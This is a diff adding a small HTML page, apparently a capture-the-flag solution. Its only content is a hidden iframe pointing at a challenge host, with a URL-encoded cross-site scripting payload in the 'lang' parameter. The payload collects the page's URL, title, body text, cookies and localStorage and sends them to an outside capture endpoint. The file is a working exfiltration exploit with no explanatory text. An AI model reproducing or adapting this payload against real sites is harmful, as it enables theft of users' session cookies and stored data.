@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test</title>
+</head>
+<body>
+    <iframe src="http://chal1.lagncra.sh:8426/?lang=%22%3E%3Cimg%20src%3D%22x%22%20onerror%3D%22var%20info%3D%7Burl%3Alocation.href%2Ctitle%3Adocument.title%2Cbody%3Adocument.body.innerHTML.substring(0%2C500)%2Ccookies%3Adocument.cookie%2Cstorage%3AtryGetStorage()%7D%3Bfunction%20tryGetStorage()%7Btry%7Breturn%20JSON.stringify(localStorage)%7Dcatch(e)%7Breturn%20e.message%7D%7Dthis.src%3D%27https%3A//ssrf-eta.vercel.app/api/capture%3Fdata%3D%27%2BencodeURIComponent(JSON.stringify(info))%22%3E" width="1" height="1" style="display:none;"></iframe>
+</body>
+</html>
